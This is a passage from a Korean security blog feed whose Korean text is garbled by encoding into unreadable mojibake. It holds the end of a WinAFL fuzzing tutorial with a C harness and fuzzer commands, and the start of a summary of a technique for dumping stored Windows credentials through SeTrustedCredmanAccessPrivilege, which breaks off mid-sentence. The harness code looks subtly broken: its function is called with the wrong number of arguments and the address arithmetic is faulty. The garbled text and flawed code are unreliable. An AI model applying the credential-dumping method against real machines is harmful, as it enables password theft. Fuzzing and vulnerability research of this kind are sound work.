ì¬ì‹œì‘í•˜ëŠ”ë° ë“œëŠ” ì‹œê°„ì„ ì ˆì•½í•  ìˆ˜ ìˆê³  íƒ€ê²Ÿ í•¨ìˆ˜ì™€ ê·¸ ì„œë¸Œ ë£¨í‹´ë§Œì„ í¼ì§• í•˜ê¸° ë•Œë¬¸ì— ê·¸ë§Œí¼ ë¹ ë¥¸ ì†ë„ë¥¼ ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="í™˜ê²½-ì„¤ì •"><a href="#í™˜ê²½-ì„¤ì •" class="headerlink" title="í™˜ê²½ ì„¤ì •"></a>í™˜ê²½ ì„¤ì •</h1><p>ê¸°ë³¸ì ì¸ ì„¤ëª…ì´ ëë‚¬ìœ¼ë‹ˆ ì§ì ‘ ì‚¬ìš©í•´ë´ì•¼ê² ì£ ? <a href="https://github.com/googleprojectzero/winafl">WinAFL ê³µì‹ ê¹ƒí—ˆë¸Œ</a>ì— ë¹Œë“œí•˜ëŠ” ë°©ë²•ì´ ì“°ì—¬ìˆê¸°ëŠ” í•˜ì§€ë§Œ ì €ëŠ” ê·¸ê±¸ ë³´ê³ ë„ ì‚½ ì§‘í•´ì„œ ê¸€ë¡œ ë‚¨ê²¨ë†“ê² ìŠµë‹ˆë‹¤. <del>ë©ì²­ì´</del></p><p><img src="/2021/05/23/fabu1ous/winafl-1/2.png"></p><h3 id="ì¤€ë¹„ë¬¼"><a href="#ì¤€ë¹„ë¬¼" class="headerlink" title="ì¤€ë¹„ë¬¼"></a>ì¤€ë¹„ë¬¼</h3><ol><li>Visual Studio</li><li>DynamoRIO</li><li>cmake</li><li>WinAFL</li></ol><p>ê°ê° ê³µì‹ í™ˆí˜ì´ì§€ë‚˜ ê¹ƒí—ˆë¸Œì—ì„œ ì‰½ê²Œ êµ¬í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì„¤ë§ˆ ì—¬ê¸°ì„œë¶€í„° ë§‰íˆì‹œëŠ” ë¶„ì€ ì—†ìœ¼ë¦¬ë¼ ìƒê°í•©ë‹ˆë‹¤. ì›¬ë§Œí•˜ë©´(íŠ¹íˆ Visual StudioëŠ”) ìµœì‹  ë²„ì „ìœ¼ë¡œ ì¤€ë¹„í•´ì£¼ì„¸ìš”.  </p><p><img src="/2021/05/23/fabu1ous/winafl-1/3.png"></p><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> build<span class="hljs-number">32</span><span class="hljs-attribute">cd</span> build<span class="hljs-number">32</span><span class="hljs-attribute">cmake</span> -G<span class="hljs-string">&quot;Visual Studio 16 2019&quot;</span> -A Win<span class="hljs-number">32</span> .. -DDynamoRIO_DIR=%DynamoRIOê²½ë¡œ%\cmake</code></pre><p>Visual Studioì˜ command promptë¥¼ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•˜ê³  winafl-master í´ë” ë‚´ë¶€ë¡œ ë“¤ì–´ê°€ ìœ„ ëª…ë ¹ì–´ë“¤ì„ ì‹¤í–‰í•´ ì£¼ì‹œë©´ ë©ë‹ˆë‹¤. ì €ëŠ” 32bitì§œë¦¬ DLLì„ í¼ì§• í•˜ê¸° ìœ„í•´ <code>x86_x64 Cross Tools Command Prompt</code>ë¥¼ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤. <code>-DDynamoRIO</code> ì˜µì…˜ ê°’ì— DynamoRIO ì†ì— ìˆëŠ” cmake í´ë”ë¡œ ì§€ì •í•´ì£¼ì…”ì•¼ í•©ë‹ˆë‹¤.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/4.png"></p><p>ìœ„ ì‚¬ì§„ê³¼ ê°™ì´ Configuring done, Generateing doneì´ ì¶œë ¥ëœë‹¤ë©´ ë¹Œë“œ ì¤€ë¹„ê°€ ëë‚¬ìŠµë‹ˆë‹¤.</p><pre><code class="hljs bash">cmake --build . --config Release</code></pre><p>ì´ì œ ìœ„ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•´ ë¹Œë“œí•´ì£¼ì‹œë©´ ë©ë‹ˆë‹¤. ë¹Œë“œê°€ ì˜ ë˜ì—ˆë‹¤ë©´ <code>%winafl-master%\build32\bin\Release</code>ì— afl-fuzz.exeì™€ winafl.dllì´ ìˆìŠµë‹ˆë‹¤. ì‹¤ì œë¡œ í¼ì§•ì„ ëŒë¦´ ë•Œ ì‚¬ìš©í•  ì¹œêµ¬ë“¤ì´ë‹ˆ ê¼­ ìœ„ì¹˜ë¥¼ ê¸°ì–µí•´ë‘ì„¸ìš”. git clone í•˜ë©´ì„œ ì´ë¯¸ ì»´íŒŒì¼ëœ ì‹¤í–‰íŒŒì¼ë„ ì¡´ì¬í•˜ëŠ”ë° ì´ê²ƒë“¤ê³¼ í–‡ê°ˆë¦¬ì‹œë©´ ì•ˆ ë©ë‹ˆë‹¤.</p><h1 id="Target-Function"><a href="#Target-Function" class="headerlink" title="Target Function"></a>Target Function</h1><p>WinAFLì€ í”„ë¡œì„¸ìŠ¤ë¥¼ ì¢…ë£Œí•˜ì§€ ì•Šê³  íƒ€ê²Ÿ í•¨ìˆ˜ë§Œì„ ë°˜ë³µ ì‹¤í–‰í•©ë‹ˆë‹¤. ì•„ë¬´ í•¨ìˆ˜ë‚˜ íƒ€ê²Ÿìœ¼ë¡œ ì¡ê³  í¼ì§•ì„ ëŒë¦´ ìˆ˜ ìˆëŠ” ê²ƒì€ ì•„ë‹ˆê³  ëª‡ ê°€ì§€ ì¶©ì¡±í•´ì•¼ í•  ì¡°ê±´ë“¤ì´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í¼ì§•ì— ë“¤ì–´ê°€ê¸° ì•ì„œ ë¨¼ì € íƒ€ê²Ÿ í”„ë¡œê·¸ë¨ì— ëŒ€í•œ ë¶„ì„ì„ í•´ì•¼ í•˜ê³  íƒ€ê²Ÿ í•¨ìˆ˜ ì„ ì •ì— ë§ì€ ì‹œê°„ì„ íˆ¬ìí•˜ê²Œ ë  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. <del>ì°¸ ê¹ê¹í•˜ë‚´</del></p><p>íƒ€ê²Ÿ í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ì¡°ê±´ì„ ë§Œì¡±í•´ì•¼ í•©ë‹ˆë‹¤.</p><ol><li>í•¨ìˆ˜ ë‚´ì—ì„œ input íŒŒì¼ì„ ì—´ì–´ì•¼ í•¨</li><li>ê·¸ íŒŒì¼ì„ íŒŒì‹± í•´ì•¼ í•¨</li><li>í•¨ìˆ˜ ë‚´ì—ì„œ input íŒŒì¼ì„ ë‹«ì•„ì•¼ í•¨</li><li>ë¦¬í„´ê¹Œì§€ ì •ìƒì ìœ¼ë¡œ ì‹¤í–‰ë˜ì–´ì•¼ í•¨</li></ol><p>ìœ„ ì¡°ê±´ì„ ë§Œì¡±í•˜ëŠ” í•¨ìˆ˜ë¥¼ ì°¾ê¸° ìœ„í•´ ì œê°€ ì‚¬ìš©í•œ ë°©ë²•ì„ ì‘ì„±í•´ë³´ê² ìŠµë‹ˆë‹¤. ìš°ì„  íƒ€ê²Ÿ í•¨ìˆ˜ë¥¼ ì°¾ê¸° ìœ„í•´ì„  íƒ€ê²Ÿ í”„ë¡œê·¸ë¨ì´ ì–´ë–¤ DLLì„ ì‚¬ìš©í•˜ëŠ”ì§€, ê·¸ DLLì˜ ì—­í• ì€ ë¬´ì—‡ì¸ì§€ ëŒ€ê°• ì•Œì•„ì•¼ í•©ë‹ˆë‹¤.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/5.png"></p><p>ë§ˆìš°ìŠ¤ ì»¤ì„œë¥¼ DLLìœ„ì— ì˜¬ë ¤ë³´ë©´ íŒŒì¼ ì„¤ëª…, ì œì¡°ì‚¬, íŒŒì¼ ë²„ì „ ë“±ì˜ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆê³  ì´ëŠ” 1ì°¨ì ìœ¼ë¡œ íƒ€ê²Ÿ DLLì„ ì •í•˜ëŠ”ë° ë„ì›€ì´ ë©ë‹ˆë‹¤. </p><p><img src="/2021/05/23/fabu1ous/winafl-1/6.png"></p><p>ì ë‹¹í•œ DLLì„ ì°¾ìœ¼ì…¨ë‹¤ë©´ IDAë¡œ ì—´ì–´ì„œ Exports í…Œì´ë¸” í›‘ì–´ë´…ì‹œë‹¤. ìš´ì´ ì¢‹ë‹¤ë©´ External symbolì´ ì‚´ì•„ìˆëŠ” í•¨ìˆ˜ë“¤ ì¤‘ ì´ë¦„ì— File ì–´ì©Œê³ ì €ì©Œê³ í•˜ëŠ” í•¨ìˆ˜ê°€ ëª‡ ê°œ ìˆì„ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì´ë¦„ë§Œ ë³´ê³ ë„ íƒ€ê²Ÿ í•¨ìˆ˜ì˜ ìì§ˆì´ ë³´ì´ëŠ” ê²½ìš°ê°€ ìˆì„ í…ë° ë””ì»´íŒŒì¼í•œ í›„ ìœ„ ì¡°ê±´ì— ì¶©ì¡±í•˜ëŠ”ì§€ í™•ì¸í•´ ë³´ì‹œë©´ ë©ë‹ˆë‹¤. ì €ì²˜ëŸ¼ External symbolì´ ì‚´ì•„ìˆëŠ” í•¨ìˆ˜ê°€ ê±°ì˜ ì—†ê³  ê·¸ë§ˆì €ë„ íƒ€ê²Ÿ í•¨ìˆ˜ ì¶©ì¡± ì¡°ê±´ì— ë§Œì¡±í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´</p><p><img src="/2021/05/23/fabu1ous/winafl-1/7.png"></p><p>Imports í…Œì´ë¸”ì—ì„œ íŒŒì¼ í•¨ìˆ˜(ì˜ˆë¥¼ ë“¤ë©´ fopen, wfopen, wfopen_s, fclose ë“±)ë¥¼ ê²€ìƒ‰í•´ë³´ì‹œë©´ ë©ë‹ˆë‹¤. ì´ë˜ë„ ì—†ë‹¤ë©´ ì €ëŠ” ë‹¤ë¥¸ íƒ€ê²Ÿì„ ì°¾ì•„ë³´ëŠ”ë° ë” ì¢‹ì€ ë°©ë²•ì„ ì•Œê³  ê³„ì‹  ë¶„ì´ ìˆë‹¤ë©´ ëŒ“ê¸€ë¡œ ë‚¨ê²¨ì£¼ì„¸ìš”. ì €ëŠ” Imports í…Œì´ë¸”ì—ì„œ í•´ë‹¹ DLLì´ <code>MSVCR100!fclose()</code>ë¥¼ ì‚¬ìš©í•œë‹¤ëŠ” ì‚¬ì‹¤ì„ ì•Œì•„ëƒˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/8.png"></p><p><img src="/2021/05/23/fabu1ous/winafl-1/9.png"></p><p>ê·¸ë‹¤ìŒ Windbgë¡œ íƒ€ê²Ÿ í”„ë¡œê·¸ë¨ì„ ì—´ì–´ ë°©ê¸ˆ ì•Œì•„ë‚¸ <code>MSVCR100!fclose()</code>ì— ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ë¥¼ ê±¸ê³  ì–´ë–¤ í•¨ìˆ˜ê°€ í˜¸ì¶œí•˜ëŠ”ì§€ ì•Œì•„ëƒˆìŠµë‹ˆë‹¤. <code>fclose()</code>ì˜ ì‹¤í–‰ì´ ëë‚˜ë©´ <code>TargetDLL+0xbf62d</code>ë¡œ ë¦¬í„´í•œë‹¤ëŠ” ì‚¬ì‹¤ì„ ì•Œ ìˆ˜ ìˆê³ </p><p><img src="/2021/05/23/fabu1ous/winafl-1/10.png"></p><p>í•´ë‹¹ ì£¼ì†Œë¥¼ ì•„ì´ë‹¤ë¡œ ì—´ì–´(ë‹¨ì¶•í‚¤ g : Jump to address) í•¨ìˆ˜ì˜ ì‹œì‘ ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë””ì»´íŒŒì¼ì„ í†µí•´ í•´ë‹¹ í•¨ìˆ˜ì˜ ì½”ë“œë¥¼ ë¶„ì„í•´ë³¸ ê²°ê³¼ file open, file parsing, file close ì‘ì—…ì´ ëª¨ë‘ ìˆì—ˆê³  ë”°ë¼ì„œ <code>TargetDLL+0xbf5c0</code>ì„ íƒ€ê²Ÿ í•¨ìˆ˜ë¡œ ì •í–ˆìŠµë‹ˆë‹¤. ì•½ê°„ì˜ íŒì„ ë“œë¦¬ìë©´ íƒ€ê²Ÿ í•¨ìˆ˜ê°€ ë°›ëŠ” ì¸ìê°€ ì ìœ¼ë©´ ì ì„ìˆ˜ë¡ ë‹¤ìŒ ë‹¨ê³„ì¸ Harness ì‘ì„±ì´ ì‰¬ì›Œì§‘ë‹ˆë‹¤. íŒŒì¼ ì´ë¦„ë§Œì„ ì¸ìë¡œ ë°›ëŠ”ë‹¤ë©´ Best!</p><h1 id="Harness"><a href="#Harness" class="headerlink" title="Harness"></a>Harness</h1><p>íƒ€ê²Ÿ í•¨ìˆ˜ë¥¼ ì •í–ˆìœ¼ë‹ˆ ì´ì œ íƒ€ê²Ÿ DLLì„ ë¡œë“œí•˜ê³  íƒ€ê²Ÿ í•¨ìˆ˜ê°€ í•„ìš”ë¡œ í•˜ëŠ” ì´ˆê¸° ì„¤ì •ì„ í•´ì£¼ëŠ” Harness í”„ë¡œê·¸ë¨ì„ ì‘ì„±í•´ì•¼ í•©ë‹ˆë‹¤. ê¸°ë³¸ì ì¸ í‹€ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>TargetDLL.dll ë¡œë“œ</li><li>GetProcAddress()ë¥¼ í˜¸ì¶œí•´ íƒ€ê²Ÿ í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ë°›ì•„ì˜´</li><li>íƒ€ê²Ÿ í•¨ìˆ˜ í˜¸ì¶œ</li></ol><p>ì•„ì‰½ê²Œë„ ì œê°€ ì •í•œ íƒ€ê²Ÿ í•¨ìˆ˜ëŠ” ì‹¬ë³¼ì´ ì£½ì–´ìˆë”êµ°ìš”. GetProcAddress()ë¥¼ ì‚¬ìš©í•´ í•¨ìˆ˜ ì£¼ì†Œë¥¼ ë°›ì•„ì˜¬ ìˆ˜ ì—†ìœ¼ë‹ˆ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜ì •í–ˆìŠµë‹ˆë‹¤.</p><ol><li>TargetDll.dll ë¡œë“œ</li><li>TargetDll.dllì˜ base ì£¼ì†Œ + íƒ€ê²Ÿ í•¨ìˆ˜ì˜ offset = íƒ€ê²Ÿ í•¨ìˆ˜ ì£¼ì†Œ</li><li>íƒ€ê²Ÿ í•¨ìˆ˜ í˜¸ì¶œ</li></ol><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*TARGET)</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* filename)</span></span>;TARGET funcPtr;<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) __declspec(noinline) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fuzzme</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* path)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> result = funcPtr(path);<span class="hljs-keyword">return</span> result;&#125; <span class="hljs-comment">// í¼ì €ì— ì§€ì •í•´ì¤„ ë°˜ë³µ ì‹¤í–‰ ëŒ€ìƒì…ë‹ˆë‹¤. Extern symbolì„ ì‚´ë ¤ë‘ê³ </span><span class="hljs-comment">// ì»´íŒŒì¼ëŸ¬ê°€ ì¸ë¼ì¸ ì²˜ë¦¬í•˜ì§€ ì•Šë„ë¡ ì„¤ì •í•´ì¤ë‹ˆë‹¤.</span><span class="hljs-function"><span class="hljs-keyword">wchar_t</span>* <span class="hljs-title">charToWChar</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* text)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">size_t</span> size = <span class="hljs-built_in">strlen</span>(text) + <span class="hljs-number">1</span>;<span class="hljs-keyword">wchar_t</span>* wa = (<span class="hljs-keyword">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">wchar_t</span>) * size);mbstowcs(wa, text, size);<span class="hljs-keyword">return</span> wa;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;SetDllDirectory(<span class="hljs-string">&quot;...&quot;</span>); <span class="hljs-comment">// Dll ê²½ë¡œ</span>HMODULE DLLHandle = LoadLibrary(<span class="hljs-string">&quot;TargetDll.dll&quot;</span>); <span class="hljs-comment">// íƒ€ê²Ÿ DLL</span><span class="hljs-keyword">if</span> (DLLHandle == <span class="hljs-number">0</span>)&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot load TargetDll.dll\n&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;&#125;funcPtr = (TARGET)DLLHandle + <span class="hljs-number">0xbf5c0</span>; <span class="hljs-comment">// base + offset</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>, DLLHandle);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>, funcPtr);<span class="hljs-keyword">int</span> result = fuzzme(funcPtr, charToWChar(argv[<span class="hljs-number">1</span>]));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, result);&#125;</code></pre><p>íŒŒì¼ ì´ë¦„ì„ <code>main</code>ì˜ <code>argv</code>ë¡œ ë°›ì•„ì™€ <code>fuzzme</code>ë¥¼ ê±°ì³ íƒ€ê²Ÿ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ëŠ” Harness ì½”ë“œì…ë‹ˆë‹¤. íƒ€ê²Ÿ DLLì´ 32bitê³  WinAFLë„ 32bitë¡œ ë¹Œë“œí–ˆëŠ”ë° Harnessë¥¼ 64bitë¡œ ì»´íŒŒì¼í•˜ë©´ ì•ˆ ë˜ê² ì£ ? 32bitë¡œ ì»´íŒŒì¼í•´ì¤ë‹ˆë‹¤.</p><pre><code class="hljs lsl">cd %DynamoRIOê²½ë¡œ%\bin32drrun.exe -c <span class="hljs-string">&quot;%winaflê²½ë¡œ%<span class="hljs-subst">\\</span>build32<span class="hljs-subst">\\</span>bin<span class="hljs-subst">\\</span>Release<span class="hljs-subst">\\</span>winafl.dll&quot;</span> -debug -target_module harness.exe -coverage_module <span class="hljs-string">&quot;%íƒ€ê²ŸDLLê²½ë¡œ%&quot;</span> -target_method fuzzme -fuzz_iterations <span class="hljs-number">10</span> -nargs <span class="hljs-number">1</span> -- <span class="hljs-string">&quot;%harnessê²½ë¡œ%&quot;</span> <span class="hljs-string">&quot;%íŒŒì¼ê²½ë¡œ%&quot;</span></code></pre><p>ì´ì œ ì‘ì„±í•œ Harnessë¥¼ ë””ë²„ê·¸ ëª¨ë“œë¡œ í…ŒìŠ¤íŠ¸í•´ë³¼ ì‹œê°„ì…ë‹ˆë‹¤. DanamoRIOì˜ bin32 í´ë”ë¡œ ë“¤ì–´ê°€ ìœ„ì™€ ê°™ì€ ëª…ë ¹ì–´ë¥¼ í†µí•´ Harnessê°€ í¼ì§•ì— ì í•©í•œì§€ ê²€ì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/11.png"></p><p>í…ŒìŠ¤íŠ¸ê°€ ëë‚˜ë©´ bin32 í´ë”ì— í…ŒìŠ¤íŠ¸ ë¡œê·¸ê°€ ë‚¨ì•„ìˆìŠµë‹ˆë‹¤. ìœ„ ëª…ë ¹ì–´ëŠ” í…ŒìŠ¤íŠ¸ ì˜µì…˜ ì¤‘ <code>iterations</code>ë¥¼ 10ìœ¼ë¡œ ì£¼ì—ˆìœ¼ë¯€ë¡œ ì´ 10ë²ˆì˜ ì‹¤í–‰ì´ ë¡œê·¸ì— ë‚¨ì•„ìˆì–´ì•¼ í•˜ë©° â€œEverything appears to be running normally.â€ë¼ëŠ” ë¡œê·¸ê°€ ìˆë‹¤ë©´ ì„±ê³µì…ë‹ˆë‹¤.</p><h1 id="ë§ˆêµ¬-í¼ì§•í•˜ê¸°"><a href="#ë§ˆêµ¬-í¼ì§•í•˜ê¸°" class="headerlink" title="ë§ˆêµ¬ í¼ì§•í•˜ê¸°"></a>ë§ˆêµ¬ í¼ì§•í•˜ê¸°</h1><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> <span class="hljs-string">&quot;%winafl-master%ê²½ë¡œ\build32\bin\Release&quot;</span><span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -D %DynamoRIOê²½ë¡œ% -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe - target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">1</span> -- <span class="hljs-string">&quot;%harnessê²½ë¡œ&quot;</span> @@</code></pre><p>ì! ë“œë””ì–´ í¼ì§•ì„ í•  ë•Œê°€ ì™”ìŠµë‹ˆë‹¤. ë¹Œë“œí•œ WinAFL í´ë”ë¡œ ì´ë™í•œ í›„ ìœ„ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•´ í¼ì§•ì„ ì‹œì‘í•©ë‹ˆë‹¤. WinAFLì´ <code>fuzzme</code> í•¨ìˆ˜ë¥¼ 5000ë²ˆ ì‹¤í–‰í•˜ê³  í”„ë¡œì„¸ìŠ¤ë¥¼ ì¬ì‹œì‘í•˜ë„ë¡ ì˜µì…˜ì„ ì£¼ì—ˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/12.png"></p><p>ì´ë ‡ê²Œ í•˜ë©´ WinAFLì€ ì—„ì²­ë‚œ ì†ë„ë¡œ í’â€¦</p><p><img src="/2021/05/23/fabu1ous/winafl-1/13.png"></p><p><img src="/2021/05/23/fabu1ous/winafl-1/14.png"></p><h1 id="Part-2-ì˜ˆê³ "><a href="#Part-2-ì˜ˆê³ " class="headerlink" title="Part 2 ì˜ˆê³ "></a>Part 2 ì˜ˆê³ </h1><p>3ì´ˆì— 1ë²ˆ ê¼´ë¡œ íƒ€ê²Ÿì´ ì‹¤í–‰ë˜ëŠ” ê±¸ ë³´ë©´ Harnessì— í° í•˜ìê°€ ìˆëŠ” ê²ƒì´ ë¶„ëª…í•©ë‹ˆë‹¤. ë‹¤ìŒ ê¸€ì—ì„  ì´ ì‹¤í–‰ ì†ë„ë¥¼ ê°œì„ í•˜ê¸° ìœ„í•´ ì‚½ì§ˆí•œ ê³¼ì •ì„ ì‘ì„±í•´ ì˜¤ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>winafl</tag>
      
      <tag>fuzzing</tag>
      
      <tag>harness</tag>
      
      <tag>bug bounty</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege</title>
    <link href="/2021/05/23/j0ker/2021-05-23/"/>
    <url>/2021/05/23/j0ker/2021-05-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html">Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windowsì—ì„œëŠ” <code>Credential Manager</code>ë¥¼ í†µí•´ credentialë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Credentialë“¤ì€ DPAPIë¥¼ í†µí•´ ë³´í˜¸ë˜ë©°, ì‹œìŠ¤í…œì— ì¸ì¦ëœ ì‚¬ìš©ìë§Œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì˜ˆë¥¼ ë“¤ì–´, Remote Desktop Clientì—ì„œëŠ” <code>CredWrite</code>ë¼ëŠ” APIë¥¼ í†µí•´ domain credentialì„ ì €ì¥í•©ë‹ˆë‹¤. ì´ ë•Œ <code>CREDENTIAL</code> êµ¬ì¡°ì²´ì— ìœ ì €ëª…ê³¼ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì €ì¥í•˜ê²Œ ë˜ë©° typeì€ <code>CRED_TYPE_DOMAIN_PASSWORD</code>ìœ¼ë¡œ ì„¸íŒ…ë©ë‹ˆë‹¤. ì´ë ‡ê²Œ ì €ì¥ëœ credentialë“¤ì€ <code>CredRead</code>, <code>CredEnumerate</code> ê°™ì€ APIë¥¼ í†µí•´ ì½ì–´ì˜¬ ìˆ˜ ìˆì§€ë§Œ, <code>CRED_TYPE_DOMAIN_PASSWORD</code>ë¡œ typeì´ ì„¸íŒ…ë˜ë©´ credentialì„ ì½ì–´ì™€ë„ êµ¬ì¡°ì ìœ¼ë¡œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì½ì„ ìˆ˜ ì—†ê²Œ êµ¬í˜„ë˜ì–´ ìˆìŠµë‹ˆë‹¤. NTLM, Kerberos, TSSSP ê°™ì´ LSASS í”„ë¡œì„¸ìŠ¤ì—ì„œ ì‹¤í–‰ë˜ëŠ” ë³´ì•ˆ íŒ¨í‚¤ì§€ë“¤ì€ ë‚´ë¶€ APIë¥¼ í†µí•´ ì´ëŸ° ì œì•½ ì—†ì´ credential ë¹„ë°€ë²ˆí˜¸ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>Credentialì€ ì‚¬ìš©ìì˜ <code>DPAPI</code> í‚¤ë¡œ ì•”í˜¸í™”ë˜ì–´ íŒŒì¼ í˜•ì‹ìœ¼ë¡œ ì €ì¥ë©ë‹ˆë‹¤. ì´ë¥¼ ì§ì ‘ì ìœ¼ë¡œ ë³µí˜¸í™”í•˜ì—¬ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì½ì–´ì˜¬<code>ìˆ˜ ì—†ëŠ” ì´ìœ ëŠ” ì‚¬ìš©ìì˜</code>DPAPI<code>í‚¤ë¥¼ ì‚¬ìš©í•˜ë”ë¼ë„ LSASSì—ì„œ ì‹¤í–‰ë˜ëŠ” ì½”ë“œì—ì„œë§Œ DPAPIë¥¼ í˜¸ì¶œí•˜ì—¬ ë³µí˜¸í™”í•  ìˆ˜ ìˆë„ë¡ êµ¬í˜„ë˜ì–´ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë”°ë¼ì„œ</code>Mimikatz<code>ê°™ì€ íˆ´ì—ì„œëŠ”</code>LSASS`ì— ì½”ë“œë¥¼ ì‚½ì…í•˜ê±°ë‚˜ ë©”ëª¨ë¦¬ë¥¼ ë°”ë¡œ ì½ì–´ë“¤ì´ëŠ” ë“± ë°©ì‹ì„ í†µí•´ credentialì„ ì½ì–´ë“¤ì…ë‹ˆë‹¤.</p><p>ì´ ê¸€ì—ì„œ James ForshawëŠ” <code>LSASS</code>ì— ì½”ë“œë¥¼ ì‚½ì…í•˜ì§€ ì•Šê³  <code>SeTrustedCredmanAccessPrivilege</code> ê¶Œí•œì„ ì´ìš©í•´ credentialì„ ë³µí˜¸í™”í•˜ëŠ” ìƒˆë¡œìš´ ë°©ë²•ì„ ì œì•ˆí•©ë‹ˆë‹¤.</p><p><code>SeTrustedCredmanAccessPrivilege</code>ê¶Œí•œì€ ì‚¬ìš©ìê°€ ì¸ì¦ëœ ì‚¬ìš©ìë¡œì„œ <code>Credential Manager</code>ì— ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ê¶Œí•œì…ë‹ˆë‹¤. LSASRV.dllì— êµ¬í˜„ë˜ì–´ ìˆëŠ” ì½”ë“œë¥¼ ë³´ë©´ <code>CredpIsRpcClientTrusted</code> í•¨ìˆ˜ì—ì„œ í•´ë‹¹ ê¶Œí•œì„ ì²´í¬í•˜ëŠ”ë°, ì´ í•¨ìˆ˜ëŠ” <code>CredrReadByTokenHandle</code>ì™€ <code>CredrBackupCredentials</code> ì´ ë‘ í•¨ìˆ˜ì—ì„œë§Œ í˜¸ì¶œë©ë‹ˆë‹¤. ì´ ì¤‘ <code>CredBackupCredentials</code> í•¨ìˆ˜ëŠ” ì‚¬ìš©ìì˜ credentialì„ ë°±ì—…í•˜ëŠ” ê¸°ëŠ¥ì„ ì œê³µí•˜ë©° <code>SeTrustedCredmanAccessPrivilege</code> ê¶Œí•œë§Œ ê°€ì§€ê³  ìˆìœ¼ë©´ í˜¸ì¶œì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. <code>CREDWIZ.exe</code> í”„ë¡œê·¸ë¨ì—ì„œ í•´ë‹¹ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. <code>CREDWIZ.exe</code>ë¥¼ ì‹¤í–‰í•˜ë©´ ë°±ì—…í•  ê²½ë¡œë¥¼ ì§€ì •í•˜ê³  